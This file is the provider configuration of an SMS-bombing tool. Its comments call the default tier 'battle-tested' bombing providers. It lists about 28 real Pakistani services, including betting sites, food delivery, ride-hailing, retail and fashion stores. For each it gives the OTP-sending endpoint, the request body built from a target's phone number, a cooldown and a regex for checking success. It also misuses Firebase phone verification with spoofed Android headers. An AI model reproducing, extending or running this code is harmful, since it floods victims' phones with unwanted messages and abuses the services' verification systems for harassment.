// tier: 'core' = battle-tested, default bomb. 'extra' = bonus, tier=extra se.
// cooldown = seconds (45-240). urls = fallback order. mode = 'json' | 'form' | 'query'
// available() = env based provider (firebase) ke liye.

export const PROVIDERS = [
  // ================= CORE =================
  {
    id: '1xbet', name: '1xBet', category: 'betting', tier: 'core', cooldown: 45,
    warmup: 'https://1xbet.pk/',
    urls: ['https://1xbet.pk/service-api/auth/send-sms'],
    mode: 'form',
    body: (p) => ({ phone: p.bare }),
    ok: /true|success|sent/i,
  },
  {
    id: 'mostbet', name: 'Mostbet', category: 'betting', tier: 'core', cooldown: 45,
    urls: ['https://mostbet.pk/api/auth/send-sms'],
    mode: 'form',
    body: (p) => ({ phone: p.bare }),
    ok: /success|sent|true/i,
  },
  {
    id: 'melbet', name: 'Melbet', category: 'betting', tier: 'core', cooldown: 60,
    warmup: 'https://melbet.pk/',
    urls: ['https://melbet.pk/service-api/auth/send-sms'],
    mode: 'form',
    body: (p) => ({ phone: p.bare }),
    ok: /true|success|sent/i,
  },
  {
    id: '22bet', name: '22Bet', category: 'betting', tier: 'core', cooldown: 60,
    warmup: 'https://22bet.pk/',
    urls: ['https://22bet.pk/service-api/auth/send-sms'],
    mode: 'form',
    body: (p) => ({ phone: p.bare }),
    ok: /true|success|sent/i,
  },
  {
    id: 'foodpanda', name: 'Foodpanda PK', category: 'food', tier: 'core', cooldown: 90,
    warmup: 'https://www.foodpanda.pk/',
    urls: ['https://www.foodpanda.pk/api/v1/customers/send_verification_code'],
    mode: 'json', headers: { origin: 'https://www.foodpanda.pk' },
    body: (p) => ({ customer: { phone: p.e164 } }),
    ok: /sent|success|verification/i,
  },
  {
    id: 'bykea', name: 'Bykea', category: 'ride', tier: 'core', cooldown: 60,
    urls: ['https://api.bykea.net/api/v1/auth/otp'],
    mode: 'json', headers: { origin: 'https://bykea.com' },
    body: (p) => ({ phone: p.e164, countryCode: 'PK' }),
    ok: /success|sent|ok/i,
  },
  {
    id: 'careem', name: 'Careem', category: 'ride', tier: 'core', cooldown: 120,
    warmup: 'https://www.careem.com/',
    urls: ['https://www.careem.com/api/v2/customer/otp'],
    mode: 'json',
    body: (p) => ({ phone_number: p.e164, locale: 'en' }),
    ok: /success|sent/i,
  },
  {
    id: 'daraz', name: 'Daraz PK', category: 'market', tier: 'core', cooldown: 180,
    warmup: 'https://www.daraz.pk/',
    urls: ['https://www.daraz.pk/api/v2/user/sendSmsCode'],
    mode: 'json', headers: { origin: 'https://www.daraz.pk', referer: 'https://www.daraz.pk/' },
    body: (p) => ({ phone: p.local, scene: 'login' }),
    ok: /success|sent|true/i,
  },
  {
    id: 'olx', name: 'OLX PK', category: 'market', tier: 'core', cooldown: 150,
    warmup: 'https://www.olx.com.pk/',
    urls: ['https://www.olx.com.pk/api/open/authorization/otp/send'],
    mode: 'json', headers: { origin: 'https://www.olx.com.pk' },
    body: (p) => ({ phone: p.local, countryCode: 'PK' }),
    ok: /success|sent/i,
  },
  {
    id: 'zameen', name: 'Zameen', category: 'realestate', tier: 'core', cooldown: 180,
    urls: ['https://www.zameen.com/api/auth/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'telemart', name: 'Telemart', category: 'retail', tier: 'core', cooldown: 120,
    urls: ['https://www.telemart.pk/api/otp/send'],
    mode: 'json',
    body: (p) => ({ mobile: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'naheed', name: 'Naheed', category: 'retail', tier: 'core', cooldown: 120,
    urls: ['https://www.naheed.pk/api/customer/sendotp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'priceoye', name: 'PriceOye', category: 'retail', tier: 'core', cooldown: 120,
    urls: ['https://priceoye.pk/api/auth/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.msisdn }),
    ok: /success|sent/i,
  },
  {
    id: 'shophive', name: 'Shophive', category: 'retail', tier: 'core', cooldown: 150,
    urls: ['https://www.shophive.com/api/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'bagallery', name: 'Bagallery', category: 'retail', tier: 'core', cooldown: 150,
    urls: ['https://bagallery.com/api/auth/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'savyour', name: 'Savyour', category: 'rewards', tier: 'core', cooldown: 120,
    urls: ['https://savyour.com.pk/api/auth/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.msisdn }),
    ok: /success|sent/i,
  },
  {
    id: 'bookme', name: 'Bookme', category: 'travel', tier: 'core', cooldown: 90,
    urls: ['https://bookme.pk/api/auth/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'sastaticket', name: 'Sastaticket', category: 'travel', tier: 'core', cooldown: 120,
    urls: ['https://www.sastaticket.pk/api/v1/auth/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.e164 }),
    ok: /success|sent/i,
  },
  {
    id: 'bajao', name: 'Bajao.pk', category: 'tools', tier: 'core', cooldown: 60,
    warmup: 'https://bajao.pk/create',
    urls: [
      'https://bajao.pk/api/auth/send-otp',
      'https://bajao.pk/api/send-otp',
      'https://bajao.pk/api/otp/send',
    ],
    mode: 'json',
    headers: { origin: 'https://bajao.pk', referer: 'https://bajao.pk/create' },
    body: (p) => ({ phone: p.local, purpose: 'signup' }),
    ok: /success|sent|otp|true/i,
  },
  {
    id: 'firebase', name: 'Firebase (own project)', category: 'infra', tier: 'core', cooldown: 60,
    available: () => !!process.env.FIREBASE_API_KEY,
    urls: ['https://identitytoolkit.googleapis.com/v1/accounts:sendVerificationCode'],
    mode: 'query',
    headers: () => ({
      'x-android-package': process.env.FIREBASE_ANDROID_PACKAGE || 'com.google.android.gms',
      'x-android-cert': process.env.FIREBASE_ANDROID_CERT || '',
      'x-client-version': 'Android/Fallback/X220000000/FirebaseCore-Android',
    }),
    body: (p) => ({ key: process.env.FIREBASE_API_KEY, phoneNumber: p.e164 }),
    ok: /sessionInfo/i,
  },

  // ================= EXTRA =================
  {
    id: 'dominos', name: "Domino's PK", category: 'food', tier: 'extra', cooldown: 120,
    urls: ['https://www.dominos.com.pk/api/auth/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'kfc', name: 'KFC PK', category: 'food', tier: 'extra', cooldown: 120,
    urls: ['https://www.kfcpakistan.com/api/auth/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'ishopping', name: 'iShopping', category: 'retail', tier: 'extra', cooldown: 150,
    urls: ['https://www.ishopping.pk/api/otp/send'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'symbios', name: 'Symbios', category: 'retail', tier: 'extra', cooldown: 150,
    urls: ['https://www.symbios.pk/api/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'chaseup', name: 'Chase Up', category: 'retail', tier: 'extra', cooldown: 150,
    urls: ['https://chaseup.com.pk/api/auth/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'khaadi', name: 'Khaadi', category: 'fashion', tier: 'extra', cooldown: 180,
    urls: ['https://www.khaadi.com/pk/api/auth/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'limelight', name: 'Limelight', category: 'fashion', tier: 'extra', cooldown: 180,
    urls: ['https://www.limelight.pk/api/auth/otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
  {
    id: 'sapphire', name: 'Sapphire', category: 'fashion', tier: 'extra', cooldown: 180,
    urls: ['https://pk.sapphireonline.pk/api/auth/send-otp'],
    mode: 'json',
    body: (p) => ({ phone: p.local }),
    ok: /success|sent/i,
  },
];

export const byId = (id) => PROVIDERS.find((p) => p.id === id);

for (const p of PROVIDERS) {
  if (!p.id || !p.urls?.length || !p.mode || !p.body || !p.ok || !p.cooldown) {
    throw new Error('invalid provider: ' + (p.id || 'unknown'));
  }
    }
